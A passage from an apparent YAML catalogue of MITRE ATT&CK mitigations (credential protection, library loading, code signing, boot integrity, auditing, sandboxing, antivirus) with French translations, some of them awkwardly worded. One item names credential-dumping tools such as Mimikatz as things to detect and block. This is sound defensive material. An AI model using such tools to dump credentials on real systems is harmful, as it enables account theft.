          \ pour isoler les secrets et les prot\xE9ger contre les acc\xE8s non autoris\xE9\
          s.\n\nSurveillez les outils de d\xE9versement de cr\xE9dentiels :\n\n- Cas\
          \ d\u2019utilisation : D\xE9tecter et bloquer des outils connus comme Mimikatz\
          \ ou Windows Credential Editor.\n- Impl\xE9mentation : signaler un comportement\
          \ suspect de processus li\xE9 au dumping de cr\xE9dences.\n\nD\xE9sactivez\
          \ les identifiants mis en cache :\n\n- Cas d\u2019utilisation : emp\xEA\
          cher les adversaires d\u2019exploiter les identifiants mis en cache sur\
          \ les points de terminaison.\n- Impl\xE9mentation : Configurez la politique\
          \ de groupe pour r\xE9duire ou \xE9liminer l\u2019utilisation des identifiants\
          \ mis en cache (par exemple, d\xE9finir la connexion interactive : le nombre\
          \ de connexions pr\xE9c\xE9dentes \xE0 mettre en cache \xE0 0).\n\nActivez\
          \ les protections s\xE9curis\xE9es de d\xE9marrage et de m\xE9moire :\n\n\
          - Cas d\u2019utilisation : Emp\xEAcher les attaques bas\xE9es sur la m\xE9\
          moire utilis\xE9es pour extraire les identifiants.\n- Impl\xE9mentation\
          \ : Configurer le Secure Boot et appliquer des fonctionnalit\xE9s de s\xE9\
          curit\xE9 mat\xE9rielles telles que DEP (Data Execution Prevention) et ASLR\
          \ (Randomization de la disposition de l\u2019espace d\u2019adressage).\n\
          https://attack.mitre.org/mitigations/M1043"
  - urn: urn:intuitem:risk:function:mitre-attack:m1044
    ref_id: M1044
    name: Restrict Library Loading
    category: technical
    csf_function: protect
    description: "Restricting library loading involves implementing security controls\
      \ to ensure that only trusted and verified libraries (DLLs, shared objects,\
      \ etc.) are loaded into processes. Adversaries often abuse Dynamic-Link Library\
      \ (DLL) Injection, DLL Search Order Hijacking, or LD_PRELOAD mechanisms to execute\
      \ malicious code by forcing the operating system to load untrusted libraries.\
      \ This mitigation can be implemented through the following measures: \n\nEnforce\
      \ Safe Library Loading Practices:\n\n- Enable `SafeDLLSearchMode` on Windows.\n\
      - Restrict `LD_PRELOAD` and `LD_LIBRARY_PATH` usage on Linux systems.\n\nCode\
      \ Signing Enforcement:\n\n- Require digital signatures for all libraries loaded\
      \ into processes.\n- Use tools like Signtool, and WDAC to enforce signed DLL\
      \ execution.\n\nEnvironment Hardening:\n\n- Secure library paths and directories\
      \ to prevent adversaries from placing rogue libraries.\n- Monitor user-writable\
      \ directories and system configurations for unauthorized changes.\n\nAudit and\
      \ Monitor Library Loading:\n\n- Enable `Sysmon` on Windows to monitor for suspicious\
      \ library loads.\n- Use `auditd` on Linux to monitor shared library paths and\
      \ configuration file changes.\n\nUse Application Control Solutions:\n\n- Implement\
      \ AppLocker, WDAC, or SELinux to allow only trusted libraries.\n\n*Tools for\
      \ Implementation*\n\nWindows-Specific Tools:\n\n- AppLocker: Application whitelisting\
      \ for DLLs.\n- Windows Defender Application Control (WDAC): Restrict unauthorized\
      \ library execution.\n- Signtool: Verify and enforce code signing.\n- Sysmon:\
      \ Monitor DLL load events (Event ID 7).\n\nLinux-Specific Tools:\n\n- auditd:\
      \ Monitor changes to library paths and critical files.\n- SELinux/AppArmor:\
      \ Define policies to restrict library loading.\n- ldconfig and chattr: Secure\
      \ LD configuration files and prevent unauthorized modifications.\n\nCross-Platform\
      \ Solutions:\n\n- Wazuh or OSSEC: File integrity monitoring for library changes.\n\
      - Tripwire: Detect and alert on unauthorized library modifications.\nhttps://attack.mitre.org/mitigations/M1044"
    translations:
      fr:
        name: "Restreindre le chargement des biblioth\xE8ques"
        description: "Limiter la charge des biblioth\xE8ques implique de mettre en\
          \ place des contr\xF4les de s\xE9curit\xE9 pour garantir que seules les\
          \ biblioth\xE8ques fiables et v\xE9rifi\xE9es (DLL, objets partag\xE9s,\
          \ etc.) soient charg\xE9es dans les processus. Les adversaires abusent souvent\
          \ de l\u2019injection de biblioth\xE8ques de liens dynamiques (DLL), du\
          \ d\xE9tournement d\u2019ordre de recherche DLL ou de LD_PRELOAD m\xE9canismes\
          \ pour ex\xE9cuter du code malveillant en for\xE7ant le syst\xE8me d\u2019\
          exploitation \xE0 charger des biblioth\xE8ques non fiables. Cette att\xE9\
          nuation peut \xEAtre mise en \u0153uvre par les mesures suivantes : \n\n\
          Faire respecter des pratiques de chargement s\xFBr des biblioth\xE8ques\
          \ :\n\n- Activer le \xAB SafeDLLSearchMode \xBB sous Windows.\n- Restreindre\
          \ l\u2019utilisation de \xAB LD_PRELOAD \xBB et de \xAB LD_LIBRARY_PATH\
          \ \xBB sur les syst\xE8mes Linux.\n\nApplication de la signature de codes\
          \ :\n\n- Exiger des signatures num\xE9riques pour toutes les biblioth\xE8\
          ques charg\xE9es dans les processus.\n- Utiliser des outils comme Signtool\
          \ et WDAC pour imposer l\u2019ex\xE9cution des DLL sign\xE9s.\n\nRenforcement\
          \ de l\u2019environnement :\n\n- S\xE9curiser les chemins de biblioth\xE8\
          que et les annuaires pour emp\xEAcher les adversaires de placer des biblioth\xE8\
          ques incontr\xF4lables.\n- Surveille les r\xE9pertoires et configurations\
          \ syst\xE8me \xE9crivables par l\u2019utilisateur pour d\xE9tecter les modifications\
          \ non autoris\xE9es.\n\nAuditer et surveiller le chargement des biblioth\xE8\
          ques :\n\n- Activer \xAB Sysmon \xBB sous Windows pour surveiller les chargements\
          \ suspects de biblioth\xE8ques.\n- Utiliser \xAB auditd \xBB sous Linux\
          \ pour surveiller les chemins de biblioth\xE8que partag\xE9s et les modifications\
          \ des fichiers de configuration.\n\nUtilisez des solutions de contr\xF4\
          le d\u2019application :\n\n- Impl\xE9menter AppLocker, WDAC ou SELinux pour\
          \ n\u2019autoriser que les biblioth\xE8ques de confiance.\n\n*Outils pour\
          \ la mise en \u0153uvre*\n\nOutils sp\xE9cifiques \xE0 Windows :\n\n- AppLocker\
          \ : liste blanche des applications pour les DLL.\n- Windows Defender Application\
          \ Control (WDAC) : Restreign l\u2019ex\xE9cution non autoris\xE9e de biblioth\xE8\
          ques.\n- Signtool : V\xE9rifier et faire respecter la signature du code.\n\
          - Sysmon : Surveille les \xE9v\xE9nements de chargement des DLL (ID d\u2019\
          \xE9v\xE9nement 7).\n\nOutils sp\xE9cifiques \xE0 Linux :\n\n- audit\xE9\
          \ : Surveiller les modifications des chemins de biblioth\xE8que et des fichiers\
          \ critiques.\n- SELinux/AppArmor : D\xE9finir des politiques pour restreindre\
          \ le chargement des biblioth\xE8ques.\n- ldconfig et chattr : s\xE9curiser\
          \ les fichiers de configuration LD et pr\xE9venir les modifications non\
          \ autoris\xE9es.\n\nSolutions multiplateformes :\n\n- Wazuh ou OSSEC : Surveillance\
          \ de l\u2019int\xE9grit\xE9 des fichiers pour les modifications de la biblioth\xE8\
          que.\n- Tripwire : D\xE9tecter et alerter en cas de modifications non autoris\xE9\
          es de la biblioth\xE8que.\nhttps://attack.mitre.org/mitigations/M1044"
  - urn: urn:intuitem:risk:function:mitre-attack:m1045
    ref_id: M1045
    name: Code Signing
    category: technical
    csf_function: protect
    description: 'Code Signing is a security process that ensures the authenticity
      and integrity of software by digitally signing executables, scripts, and other
      code artifacts. It prevents untrusted or malicious code from executing by verifying
      the digital signatures against trusted sources. Code signing protects against
      tampering, impersonation, and distribution of unauthorized or malicious software,
      forming a critical defense against supply chain and software exploitation attacks.
      This mitigation can be implemented through the following measures:


      Enforce Signed Code Execution:


      - Implementation: Configure operating systems (e.g., Windows with AppLocker
      or Linux with Secure Boot) to allow only signed code to execute.

      - Use Case: Prevent the execution of malicious PowerShell scripts by requiring
      all scripts to be signed with a trusted certificate.


      Vendor-Signed Driver Enforcement:


      - Implementation: Enable kernel-mode code signing to ensure that only drivers
      signed by trusted vendors can be loaded.

      - Use Case: A malicious driver attempting to modify system memory fails to load
      because it lacks a valid signature.


      Certificate Revocation Management:


      - Implementation: Use Online Certificate Status Protocol (OCSP) or Certificate
      Revocation Lists (CRLs) to block certificates associated with compromised or
      deprecated code.

      - Use Case: A compromised certificate used to sign a malicious update is revoked,
      preventing further execution of the software.


      Third-Party Software Verification:


      - Implementation: Require software from external vendors to be signed with valid
      certificates before deployment.

      - Use Case: An organization only deploys signed and verified third-party software
      to prevent supply chain attacks.


      Script Integrity in CI/CD Pipelines:


      - Implementation: Integrate code signing into CI/CD pipelines to sign and verify
      code artifacts before production release.

      - Use Case: A software company ensures that all production builds are signed,
      preventing tampered builds from reaching customers.


      **Key Components of Code Signing**


      - Digital Signature Verification: Verifies the authenticity of code by ensuring
      it was signed by a trusted entity.

      - Certificate Management: Uses Public Key Infrastructure (PKI) to manage signing
      certificates and revocation lists.

      - Enforced Policy for Unsigned Code: Prevents the execution of unsigned or untrusted
      binaries and scripts.

      - Hash Integrity Check: Confirms that code has not been altered since signing
      by comparing cryptographic hashes.

      https://attack.mitre.org/mitigations/M1045'
    translations:
      fr:
        name: Signature de codes
        description: "La signature de code est un processus de s\xE9curit\xE9 qui\
          \ garantit l\u2019authenticit\xE9 et l\u2019int\xE9grit\xE9 des logiciels\
          \ en signant num\xE9riquement des ex\xE9cutables, des scripts et d\u2019\
          autres artefacts de code. Elle emp\xEAche l\u2019ex\xE9cution de code non\
          \ fiable ou malveillant en v\xE9rifiant les signatures num\xE9riques contre\
          \ des sources fiables. La signature de code prot\xE8ge contre la falsification,\
          \ l\u2019usurpation et la distribution de logiciels non autoris\xE9s ou\
          \ malveillants, constituant une d\xE9fense critique contre les attaques\
          \ contre la cha\xEEne d\u2019approvisionnement et l\u2019exploitation logicielle.\
          \ Cette att\xE9nuation peut \xEAtre mise en \u0153uvre par les mesures suivantes\
          \ :\n\nFaire respecter l\u2019ex\xE9cution du code sign\xE9 :\n\n- Impl\xE9\
          mentation : Configurer les syst\xE8mes d\u2019exploitation (par exemple,\
          \ Windows avec AppLocker ou Linux avec Secure Boot) pour autoriser l\u2019\
          ex\xE9cution uniquement du code sign\xE9.\n- Cas d\u2019utilisation : Emp\xEA\
          cher l\u2019ex\xE9cution de scripts PowerShell malveillants en exigeant\
          \ que tous les scripts soient sign\xE9s avec un certificat de confiance.\n\
          \nApplication des conducteurs sign\xE9e par un fournisseur :\n\n- Impl\xE9\
          mentation : Activez la signature de code en mode noyau pour garantir que\
          \ seuls les pilotes sign\xE9s par des fournisseurs de confiance puissent\
          \ \xEAtre charg\xE9s.\n- Cas d\u2019utilisation : Un pilote malveillant\
          \ tentant de modifier la m\xE9moire syst\xE8me ne se charge pas car il ne\
          \ poss\xE8de pas de signature valide.\n\nGestion des r\xE9vocations de certificats\
          \ :\n\n- Impl\xE9mentation : Utiliser le protocole de statut des certificats\
          \ en ligne (OCSP) ou les listes de r\xE9vocation de certificats (CRL) pour\
          \ bloquer les certificats associ\xE9s \xE0 un code compromis ou obsol\xE8\
          g\xE9.\n- Cas d\u2019utilisation : Un certificat compromis utilis\xE9 pour\
          \ signer une mise \xE0 jour malveillante est r\xE9voqu\xE9, emp\xEAchant\
          \ toute ex\xE9cution ult\xE9rieure du logiciel.\n\nV\xE9rification des logiciels\
          \ tiers :\n\n- Impl\xE9mentation : Exiger que les logiciels de fournisseurs\
          \ externes soient sign\xE9s avec des certificats valides avant le d\xE9\
          ploiement.\n- Cas d\u2019utilisation : Une organisation ne d\xE9ploie que\
          \ des logiciels tiers sign\xE9s et v\xE9rifi\xE9s pour pr\xE9venir les attaques\
          \ de la cha\xEEne d\u2019approvisionnement.\n\nInt\xE9grit\xE9 des scripts\
          \ dans les pipelines CI/CD :\n\n- Impl\xE9mentation : Int\xE9grer la signature\
          \ de code dans les pipelines CI/CD pour signer et v\xE9rifier les artefacts\
          \ de code avant la sortie en production.\n- Cas d\u2019utilisation : Une\
          \ entreprise de logiciels veille \xE0 ce que toutes les versions de production\
          \ soient sign\xE9es, emp\xEAchant ainsi les versions alt\xE9r\xE9es d\u2019\
          atteindre les clients.\n\n**Composants cl\xE9s de la signature de code**\n\
          \n- V\xE9rification de la signature num\xE9rique : V\xE9rifie l\u2019authenticit\xE9\
          \ du code en s\u2019assurant qu\u2019il a \xE9t\xE9 sign\xE9 par une entit\xE9\
          \ de confiance.\n- Gestion des certificats : Utilise l\u2019infrastructure\
          \ \xE0 cl\xE9 publique (PKI) pour g\xE9rer les certificats de signature\
          \ et les listes de r\xE9vocation.\n- Politique appliqu\xE9e pour le code\
          \ non sign\xE9 : Emp\xEAche l\u2019ex\xE9cution de binaires et scripts non\
          \ sign\xE9s ou non fiables.\n- V\xE9rification de l\u2019int\xE9grit\xE9\
          \ du hachage : Confirme que le code n\u2019a pas \xE9t\xE9 modifi\xE9 depuis\
          \ la signature en comparant les hachages cryptographiques.\nhttps://attack.mitre.org/mitigations/M1045"
  - urn: urn:intuitem:risk:function:mitre-attack:m1046
    ref_id: M1046
    name: Boot Integrity
    category: technical
    csf_function: protect
    description: "Boot Integrity ensures that a system starts securely by verifying\
      \ the integrity of its boot process, operating system, and associated components.\
      \ This mitigation focuses on leveraging secure boot mechanisms, hardware-rooted\
      \ trust, and runtime integrity checks to prevent tampering during the boot sequence.\
      \ It is designed to thwart adversaries attempting to modify system firmware,\
      \ bootloaders, or critical OS components. This mitigation can be implemented\
      \ through the following measures:\n\nImplementation of Secure Boot:\n\n- Implementation:\
      \ Enable UEFI Secure Boot on all systems and configure it to allow only signed\
      \ bootloaders and operating systems.\n- Use Case: An adversary attempts to replace\
      \ the system\u2019s bootloader with a malicious version to gain persistence.\
      \ Secure Boot prevents the untrusted bootloader from executing, halting the\
      \ attack.\n\nUtilization of TPMs:\n\n- Implementation: Configure systems to\
      \ use TPM-based attestation for boot integrity, ensuring that any modification\
      \ to the firmware, bootloader, or OS is detected.\n- Use Case: A compromised\
      \ firmware component alters the boot sequence. The TPM detects the change and\
      \ triggers an alert, allowing the organization to respond before further damage.\n\
      \nEnable Bootloader Passwords:\n\n- Implementation: Protect BIOS/UEFI settings\
      \ with a strong password and limit physical access to devices.\n- Use Case:\
      \ An attacker with physical access attempts to disable Secure Boot or modify\
      \ the boot sequence. The password prevents unauthorized changes.\n\nRuntime\
      \ Integrity Monitoring:\n\n- Implementation: Deploy solutions to verify the\
      \ integrity of critical files and processes after boot.\n- Use Case: A malware\
      \ infection modifies kernel modules post-boot. Runtime integrity monitoring\
      \ detects the modification and prevents the malicious module from loading.\n\
      https://attack.mitre.org/mitigations/M1046"
    translations:
      fr:
        name: "Int\xE9grit\xE9 du botte"
        description: "L\u2019int\xE9grit\xE9 du d\xE9marrage garantit qu\u2019un syst\xE8\
          me d\xE9marre en toute s\xE9curit\xE9 en v\xE9rifiant l\u2019int\xE9grit\xE9\
          \ de son processus de d\xE9marrage, de son syst\xE8me d\u2019exploitation\
          \ et de ses composants associ\xE9s. Cette att\xE9nuation vise \xE0 exploiter\
          \ des m\xE9canismes de d\xE9marrage s\xE9curis\xE9s, une confiance enracin\xE9\
          e mat\xE9riellement et des v\xE9rifications d\u2019int\xE9grit\xE9 \xE0\
          \ l\u2019ex\xE9cution pour \xE9viter toute alt\xE9ration lors de la s\xE9\
          quence de d\xE9marrage. Il est con\xE7u pour contrer les adversaires qui\
          \ tentent de modifier le firmware syst\xE8me, les chargeurs d\u2019amor\xE7\
          age ou des composants critiques du syst\xE8me d\u2019exploitation. Cette\
          \ att\xE9nuation peut \xEAtre mise en \u0153uvre par les mesures suivantes\
          \ :\n\nImpl\xE9mentation du Secure Boot :\n\n- Impl\xE9mentation : Activer\
          \ UEFI Secure Boot sur tous les syst\xE8mes et le configurer pour n\u2019\
          autoriser que les chargeurs d\u2019amor\xE7age sign\xE9s et les syst\xE8\
          mes d\u2019exploitation.\n- Cas d\u2019utilisation : Un adversaire tente\
          \ de remplacer le chargeur d\u2019amor\xE7age du syst\xE8me par une version\
          \ malveillante pour obtenir de la persistance. Secure Boot emp\xEAche le\
          \ bootloader non fiable de s\u2019ex\xE9cuter, stoppant ainsi l\u2019attaque.\n\
          \nUtilisation des TPM :\n\n- Impl\xE9mentation : Configurer les syst\xE8\
          mes pour utiliser une attestation bas\xE9e sur TPM pour l\u2019int\xE9grit\xE9\
          \ du d\xE9marrage, en veillant \xE0 ce que toute modification du firmware,\
          \ du chargeur d\u2019amor\xE7age ou du syst\xE8me d\u2019exploitation soit\
          \ d\xE9tect\xE9e.\n- Cas d\u2019utilisation : Un composant du firmware compromis\
          \ modifie la s\xE9quence de d\xE9marrage. Le TPM d\xE9tecte le changement\
          \ et d\xE9clenche une alerte, permettant \xE0 l\u2019organisation de r\xE9\
          agir avant d\u2019autres dommages.\n\nActivez les mots de passe du bootloader\
          \ :\n\n- Impl\xE9mentation : Prot\xE9ger les param\xE8tres BIOS/UEFI avec\
          \ un mot de passe fort et limiter l\u2019acc\xE8s physique aux appareils.\n\
          - Cas d\u2019utilisation : Un attaquant disposant d\u2019un acc\xE8s physique\
          \ tente de d\xE9sactiver le d\xE9marrage s\xE9curis\xE9 ou de modifier la\
          \ s\xE9quence de d\xE9marrage. Le mot de passe emp\xEAche les changements\
          \ non autoris\xE9s.\n\nSurveillance de l\u2019int\xE9grit\xE9 \xE0 l\u2019\
          ex\xE9cution :\n\n- Impl\xE9mentation : D\xE9ploie des solutions pour v\xE9\
          rifier l\u2019int\xE9grit\xE9 des fichiers et processus critiques apr\xE8\
          s le d\xE9marrage.\n- Cas d\u2019utilisation : Une infection malveillante\
          \ modifie les modules du noyau apr\xE8s le d\xE9marrage. La surveillance\
          \ de l\u2019int\xE9grit\xE9 \xE0 l\u2019ex\xE9cution d\xE9tecte la modification\
          \ et emp\xEAche le chargement du module malveillant.\nhttps://attack.mitre.org/mitigations/M1046"
  - urn: urn:intuitem:risk:function:mitre-attack:m1047
    ref_id: M1047
    name: Audit
    category: technical
    csf_function: protect
    description: "Auditing is the process of recording activity and systematically\
      \ reviewing and analyzing the activity and system configurations. The primary\
      \ purpose of auditing is to detect anomalies and identify potential threats\
      \ or weaknesses in the environment. Proper auditing configurations can also\
      \ help to meet compliance requirements. The process of auditing encompasses\
      \ regular analysis of user behaviors and system logs in support of proactive\
      \ security measures.\n\nAuditing is applicable to all systems used within an\
      \ organization, from the front door of a building to accessing a file on a fileserver.\
      \ It is considered more critical for regulated industries such as, healthcare,\
      \ finance and government where compliance requirements demand stringent tracking\
      \ of user and system activates.This mitigation can be implemented through the\
      \ following measures: \n\nSystem Audit:\n\n- Use Case: Regularly assess system\
      \ configurations to ensure compliance with organizational security policies.\n\
      - Implementation: Use tools to scan for deviations from established benchmarks.\n\
      \nPermission Audits:\n\n- Use Case: Review file and folder permissions to minimize\
      \ the risk of unauthorized access or privilege escalation.\n- Implementation:\
      \ Run access reviews to identify users or groups with excessive permissions.\n\
      \nSoftware Audits:\n\n- Use Case: Identify outdated, unsupported, or insecure\
      \ software that could serve as an attack vector.\n- Implementation: Use inventory\
      \ and vulnerability scanning tools to detect outdated versions and recommend\
      \ secure alternatives.\n\nConfiguration Audits:\n\n- Use Case: Evaluate system\
      \ and network configurations to ensure secure settings (e.g., disabled SMBv1,\
      \ enabled MFA).\n- Implementation: Implement automated configuration scanning\
      \ tools like SCAP (Security Content Automation Protocol) to identify non-compliant\
      \ systems.\n\nNetwork Audits:\n\n- Use Case: Examine network traffic, firewall\
      \ rules, and endpoint communications to identify unauthorized or insecure connections.\n\
      - Implementation: Utilize tools such as Wireshark, or Zeek to monitor and log\
      \ suspicious network behavior.\nhttps://attack.mitre.org/mitigations/M1047"
    translations:
      fr:
        name: Audit
        description: "L\u2019audit est le processus d\u2019enregistrement de l\u2019\
          activit\xE9 et de l\u2019examen syst\xE9matique et de l\u2019analyse de\
          \ l\u2019activit\xE9 et des configurations du syst\xE8me. Le but principal\
          \ de l\u2019audit est de d\xE9tecter des anomalies et d\u2019identifier\
          \ les menaces ou faiblesses potentielles de l\u2019environnement. Des configurations\
          \ d\u2019audit appropri\xE9es peuvent \xE9galement aider \xE0 respecter\
          \ les exigences de conformit\xE9. Le processus d\u2019audit comprend une\
          \ analyse r\xE9guli\xE8re des comportements des utilisateurs et des journaux\
          \ syst\xE8me afin de soutenir des mesures de s\xE9curit\xE9 proactives.\n\
          \nL\u2019audit s\u2019applique \xE0 tous les syst\xE8mes utilis\xE9s au\
          \ sein d\u2019une organisation, de la porte d\u2019entr\xE9e d\u2019un b\xE2\
          timent \xE0 l\u2019acc\xE8s \xE0 un fichier sur un serveur de fichiers.\
          \ Elle est consid\xE9r\xE9e comme plus cruciale pour les secteurs r\xE9\
          glement\xE9s tels que la sant\xE9, la finance et le gouvernement, o\xF9\
          \ les exigences de conformit\xE9 exigent un suivi rigoureux des utilisateurs\
          \ et des activations du syst\xE8me. Cette att\xE9nuation peut \xEAtre mise\
          \ en \u0153uvre par les mesures suivantes : \n\nAudit syst\xE8me :\n\n-\
          \ Cas d\u2019utilisation : \xC9valuer r\xE9guli\xE8rement les configurations\
          \ syst\xE8me afin d\u2019assurer la conformit\xE9 aux politiques de s\xE9\
          curit\xE9 organisationnelles.\n- Mise en \u0153uvre : Utiliser des outils\
          \ pour scanner les \xE9carts par rapport aux benchmarks \xE9tablis.\n\n\
          Audits d\u2019autorisation :\n\n- Cas d\u2019utilisation : Examiner les\
          \ permissions des fichiers et dossiers afin de minimiser le risque d\u2019\
          acc\xE8s non autoris\xE9 ou d\u2019escalade de privil\xE8ges.\n- Impl\xE9\
          mentation : Effectuer des revues d\u2019acc\xE8s pour identifier les utilisateurs\
          \ ou groupes ayant des permissions excessives.\n\nAudits logiciels :\n\n\
          - Cas d\u2019utilisation : Identifier les logiciels obsol\xE8tes, non pris\
          \ en charge ou non s\xE9curis\xE9s pouvant servir de vecteur d\u2019attaque.\n\
          - Mise en \u0153uvre : Utiliser des outils d\u2019inventaire et d\u2019\
          analyse des vuln\xE9rabilit\xE9s pour d\xE9tecter les versions obsol\xE8\
          tes et recommander des alternatives s\xE9curis\xE9es.\n\nAudits de configuration\
          \ :\n\n- Cas d\u2019utilisation : \xC9valuer les configurations syst\xE8\
          me et r\xE9seau pour garantir la s\xE9curit\xE9 des param\xE8tres (par exemple,\
          \ SMBv1 d\xE9sactiv\xE9, MFA activ\xE9e).\n- Mise en \u0153uvre : Mettre\
          \ en place des outils automatis\xE9s de scan de configuration tels que SCAP\
          \ (Security Content Automation Protocol) pour identifier les syst\xE8mes\
          \ non conformes.\n\nAudits r\xE9seau :\n\n- Cas d\u2019utilisation : Examiner\
          \ le trafic r\xE9seau, les r\xE8gles de pare-feu et les communications sur\
          \ les points d\u2019extr\xE9mit\xE9 afin d\u2019identifier les connexions\
          \ non autoris\xE9es ou non s\xE9curis\xE9es.\n- Impl\xE9mentation : Utiliser\
          \ des outils tels que Wireshark ou Zeek pour surveiller et enregistrer les\
          \ comportements r\xE9seau suspects.\nhttps://attack.mitre.org/mitigations/M1047"
  - urn: urn:intuitem:risk:function:mitre-attack:m1048
    ref_id: M1048
    name: Application Isolation and Sandboxing
    category: technical
    csf_function: protect
    description: 'Application Isolation and Sandboxing refers to the technique of
      restricting the execution of code to a controlled and isolated environment (e.g.,
      a virtual environment, container, or sandbox). This method prevents potentially
      malicious code from affecting the rest of the system or network by limiting
      access to sensitive resources and critical operations. The goal is to contain
      threats and minimize their impact. This mitigation can be implemented through
      the following measures:


      Browser Sandboxing:


      - Use Case: Implement browser sandboxing to isolate untrusted web content and
      prevent malicious web pages or scripts from accessing sensitive system resources
      or initiating unauthorized downloads.

      - Implementation: Use browsers with built-in sandboxing features (e.g., Google
      Chrome, Microsoft Edge) or deploy enhanced browser security frameworks that
      limit the execution scope of active content. Consider controls that monitor
      or restrict script-based file generation and downloads commonly abused in evasion
      techniques like HTML smuggling.


      Application Virtualization:


      - Use Case: Deploy critical or high-risk applications in a virtualized environment
      to ensure any compromise does not affect the host system.

      - Implementation: Use application virtualization platforms to run applications
      in isolated environments.


      Email Attachment Sandboxing:


      - Use Case: Route email attachments to a sandbox environment to detect and block
      malware before delivering emails to end-users.

      - Implementation: Integrate security solutions with sandbox capabilities to
      analyze email attachments.


      Endpoint Sandboxing:


      - Use Case: Run all downloaded files and applications in a restricted environment
      to monitor their behavior for malicious activity.

      - Implementation: Use endpoint protection tools for sandboxing at the endpoint
      level.

      https://attack.mitre.org/mitigations/M1048'
    translations:
      fr:
        name: "Isolation des applications et bac \xE0 sable"
        description: "L\u2019isolation d\u2019applications et le bac \xE0 sable d\xE9\
          signent la technique consistant \xE0 restreindre l\u2019ex\xE9cution du\
          \ code \xE0 un environnement contr\xF4l\xE9 et isol\xE9 (par exemple, un\
          \ environnement virtuel, un conteneur ou un bac \xE0 sable). Cette m\xE9\
          thode emp\xEAche le code potentiellement malveillant d\u2019affecter le\
          \ reste du syst\xE8me ou du r\xE9seau en limitant l\u2019acc\xE8s aux ressources\
          \ sensibles et aux op\xE9rations critiques. L\u2019objectif est de contenir\
          \ les menaces et de minimiser leur impact. Cette att\xE9nuation peut \xEA\
          tre mise en \u0153uvre par les mesures suivantes :\n\nZone \xE0 sable du\
          \ navigateur :\n\n- Cas d\u2019utilisation : Mettre en place un sandboxing\
          \ dans les navigateurs pour isoler le contenu web non fiable et emp\xEA\
          cher des pages web ou scripts malveillants d\u2019acc\xE9der \xE0 des ressources\
          \ syst\xE8me sensibles ou d\u2019initier des t\xE9l\xE9chargements non autoris\xE9\
          s.\n- Impl\xE9mentation : Utiliser des navigateurs avec des fonctionnalit\xE9\
          s de sandboxing int\xE9gr\xE9es (par exemple, Google Chrome, Microsoft Edge)\
          \ ou d\xE9ployer des cadres de s\xE9curit\xE9 am\xE9lior\xE9s qui limitent\
          \ la port\xE9e d\u2019ex\xE9cution du contenu actif. Prenons l\u2019exemple\
          \ de contr\xF4les qui surveillent ou restreignent la g\xE9n\xE9ration et\
          \ le t\xE9l\xE9chargement de fichiers bas\xE9s sur des scripts, couramment\
          \ abus\xE9s dans des techniques d\u2019\xE9vasion comme la contrebande HTML.\n\
          \nVirtualisation des applications :\n\n- Cas d\u2019utilisation : d\xE9\
          ployer des applications critiques ou \xE0 haut risque dans un environnement\
          \ virtualis\xE9 afin de s\u2019assurer qu\u2019aucune compromission n\u2019\
          affecte le syst\xE8me h\xF4te.\n- Impl\xE9mentation : Utiliser des plateformes\
          \ de virtualisation d\u2019applications pour ex\xE9cuter des applications\
          \ dans des environnements isol\xE9s.\n\nSable de la pi\xE8ce jointe par\
          \ e-mail :\n\n- Cas d\u2019utilisation : Acheminer les pi\xE8ces jointes\
          \ des emails vers un environnement bac \xE0 sable afin de d\xE9tecter et\
          \ bloquer les logiciels malveillants avant de livrer les emails aux utilisateurs\
          \ finaux.\n- Mise en \u0153uvre : Int\xE9grer des solutions de s\xE9curit\xE9\
          \ avec des capacit\xE9s bac \xE0 sable pour analyser les pi\xE8ces jointes\
          \ aux e-mails.\n\nBac \xE0 sable sur les terminaux :\n\n- Cas d\u2019utilisation\
          \ : ex\xE9cuter tous les fichiers et applications t\xE9l\xE9charg\xE9s dans\
          \ un environnement restreint pour surveiller leur comportement en cas d\u2019\
          activit\xE9 malveillante.\n- Mise en \u0153uvre : Utiliser des outils de\
          \ protection des points de terminaison pour le sandboxing au niveau du point\
          \ de terminaison.\nhttps://attack.mitre.org/mitigations/M1048"
  - urn: urn:intuitem:risk:function:mitre-attack:m1049
    ref_id: M1049
    name: Antivirus/Antimalware
    category: technical
    csf_function: detect
    description: "Antivirus/Antimalware solutions utilize signatures, heuristics,\
      \ and behavioral analysis to detect, block, and remediate malicious software,\
      \ including viruses, trojans, ransomware, and spyware. These solutions continuously\
      \ monitor endpoints and systems for known malicious patterns and suspicious\
      \ behaviors that indicate compromise. Antivirus/Antimalware software should\
      \ be deployed across all devices, with automated updates to ensure protection\
      \ against the latest threats. This mitigation can be implemented through the\
      \ following measures:\n\nSignature-Based Detection:\n\n- Implementation: Use\
      \ predefined signatures to identify known malware based on unique patterns such\
      \ as file hashes, byte sequences, or command-line arguments. This method is\
      \ effective against known threats.\n- Use Case: When malware like \"Emotet\"\
      \ is detected, its signature (such as a specific file hash) matches a known\
      \ database of malicious software, triggering an alert and allowing immediate\
      \ quarantine of the infected file.\n\nHeuristic-Based Detection:\n\n- Implementation:\
      \ Deploy heuristic algorithms that analyze behavior and characteristics of files\
      \ and processes to identify potential malware, even if it doesn\u2019t match\
      \ a known signature.\n- Use Case: If a program attempts to modify multiple critical\
      \ system files or initiate suspicious network communications, heuristic analysis\
      \ may flag it as potentially malicious, even if no specific malware signature\
      \ is available.\n\nBehavioral Detection (Behavior Prevention):\n\n- Implementation:\
      \ Use behavioral analysis to detect patterns of abnormal activities, such as\
      \ unusual system calls, unauthorized file encryption, or attempts to escalate\
      \ privileges.\n- Use Case: Behavioral analysis can detect ransomware attacks\
      \ early by identifying behavior like mass file encryption, even before a specific\
      \ ransomware signature has been identified.\n\nReal-Time Scanning:\n\n- Implementation:\
      \ Enable real-time scanning to automatically inspect files and network traffic\
      \ for signs of malware as they are accessed, downloaded, or executed.\n- Use\
      \ Case: When a user downloads an email attachment, the antivirus solution scans\
      \ the file in real-time, checking it against both signatures and heuristics\
      \ to detect any malicious content before it can be opened.\n\nCloud-Assisted\
      \ Threat Intelligence:\n\n- Implementation: Use cloud-based threat intelligence\
      \ to ensure the antivirus solution can access the latest malware definitions\
      \ and real-time threat feeds from a global database of emerging threats.\n-\
      \ Use Case: Cloud-assisted antivirus solutions quickly identify newly discovered\
      \ malware by cross-referencing against global threat databases, providing real-time\
      \ protection against zero-day attacks.\n\n**Tools for Implementation**:\n\n\
      - Endpoint Security Platforms: Use solutions such as EDR for comprehensive antivirus/antimalware\
      \ protection across all systems.\n- Centralized Management: Implement centralized\
      \ antivirus management consoles that provide visibility into threat activity,\
      \ enable policy enforcement, and automate updates.\n- Behavioral Analysis Tools:\
      \ Leverage solutions with advanced behavioral analysis capabilities to detect\
